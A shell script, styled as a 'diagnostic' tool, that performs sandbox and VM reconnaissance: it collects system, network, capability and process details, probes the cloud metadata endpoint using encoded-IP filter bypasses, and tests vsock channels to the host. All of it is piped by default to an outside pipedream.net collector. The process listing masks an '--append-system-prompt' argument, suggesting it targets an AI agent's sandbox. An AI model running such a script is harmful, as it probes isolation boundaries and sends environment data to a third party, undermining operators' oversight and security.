#!/bin/sh
# diag-fast.sh
# Usage:
#   COLLECTOR_URL="https://your-collector.example/path" sh diag-fast.sh

COLLECTOR_URL="${COLLECTOR_URL:-https://eoqy29v9qqzscf0.m.pipedream.net/}"

(
set -x

echo "=== basic ==="
date
id
uname -a
cat /proc/cmdline 2>&1 || true
cat /proc/version 2>&1 || true
capsh --print 2>&1 || true

echo
echo "=== mounts/devices/network ==="
mount 2>&1 || true
cat /proc/net/route 2>&1 || true
cat /proc/net/arp 2>&1 || true
cat /proc/net/tcp 2>&1 || true
cat /etc/resolv.conf 2>&1 || true
ls -l /dev/vsock /dev/mem /dev/port /dev/kmsg /dev/snapshot /dev/vda /dev/vdb /dev/vdc /dev/vdd /dev/vde 2>&1 || true
blkid 2>&1 || true

echo
echo "=== decoded tcp listeners/connections ==="
python3 - <<'PY' 2>&1 || true
import socket

states = {
    "01": "ESTABLISHED",
    "06": "TIME_WAIT",
    "0A": "LISTEN",
}

def dec(x):
    ip_hex, port_hex = x.split(":")
    ip = socket.inet_ntoa(bytes.fromhex(ip_hex)[::-1])
    port = int(port_hex, 16)
    return ip, port

with open("/proc/net/tcp") as f:
    next(f, None)
    for line in f:
        p = line.split()
        if len(p) < 4:
            continue
        lip, lp = dec(p[1])
        rip, rp = dec(p[2])
        st = states.get(p[3], p[3])
        print(f"{st:12s} {lip}:{lp} -> {rip}:{rp}")
PY

echo
echo "=== fast tcp connect probe ==="
python3 - <<'PY' 2>&1 || true
import socket

targets = ["127.0.0.1", "192.0.2.1", "192.0.2.2", "169.254.169.254"]
ports = [80, 443, 2024, 2025]

for host in targets:
    for port in ports:
        s = socket.socket()
        s.settimeout(0.35)
        try:
            s.connect((host, port))
            print(f"OPEN {host}:{port}")
        except Exception as e:
            print(f"FAIL {host}:{port} {type(e).__name__}: {e}")
        finally:
            s.close()
PY

echo
echo "=== local control-plane minimal HTTP ==="
for u in \
  "http://127.0.0.1:2024/" \
  "http://127.0.0.1:2025/" \
  "http://192.0.2.2:2024/" \
  "http://192.0.2.2:2025/"
do
  echo "--- $u"
  timeout 1 curl -i -sS --connect-timeout 0.4 --max-time 1 "$u" 2>&1 | sed -n '1,20p'
done

echo
echo "=== egress/private policy minimal ==="
for u in \
  "http://169.254.169.254/" \
  "http://192.0.2.1/" \
  "http://10.0.0.1/" \
  "http://2852039166/" \
  "http://0xA9FEA9FE/" \
  "http://169.254.169.254.nip.io/"
do
  echo "--- $u"
  timeout 1 curl -i -sS --connect-timeout 0.4 --max-time 1 "$u" 2>&1 | sed -n '1,20p'
done

echo
echo "=== vsock minimal ==="
ls -l /dev/vsock 2>&1 || true
find /sys -maxdepth 4 -iname '*vsock*' -print 2>/dev/null | head -40 || true

python3 - <<'PY' 2>&1 || true
import socket

print("AF_VSOCK:", getattr(socket, "AF_VSOCK", None))
print("VMADDR_CID_HOST:", getattr(socket, "VMADDR_CID_HOST", None))

AF = getattr(socket, "AF_VSOCK", None)
if AF is None:
    raise SystemExit

host_cid = getattr(socket, "VMADDR_CID_HOST", 2)
for port in [80, 443, 2024, 2025, 8080]:
    s = socket.socket(AF, socket.SOCK_STREAM)
    s.settimeout(0.35)
    try:
        s.connect((host_cid, port))
        print(f"VSOCK_OPEN host:{port}")
    except Exception as e:
        print(f"VSOCK_FAIL host:{port} {type(e).__name__}: {e}")
    finally:
        s.close()
PY

echo
echo "=== device access controls: metadata only, no reads ==="
for f in /dev/mem /dev/port /dev/kmsg /dev/snapshot /dev/vsock /dev/vda /dev/vdb /dev/vdc /dev/vdd /dev/vde; do
  echo "--- $f"
  ls -l "$f" 2>&1 || true
done

echo
echo "=== caps/seccomp/proc isolation ==="
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp|Uid|Gid' /proc/self/status 2>&1 || true
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp|Uid|Gid' /proc/1/status 2>&1 || true
cat /proc/sys/kernel/yama/ptrace_scope 2>&1 || true

echo
echo "=== process visibility, shortened/redacted ==="
ps auxww 2>&1 | sed -E \
  -e 's/([A-Za-z0-9_]*(TOKEN|SECRET|PASSWORD|KEY|AUTH|CREDENTIAL)[A-Za-z0-9_]*=)[^ ]+/\1<redacted>/Ig' \
  -e 's/(--append-system-prompt ).*/\1<redacted>/g' \
  | sed -n '1,80p'

) 2>&1 | curl -s -m 5 -X POST --data-binary @- "$COLLECTOR_URL"
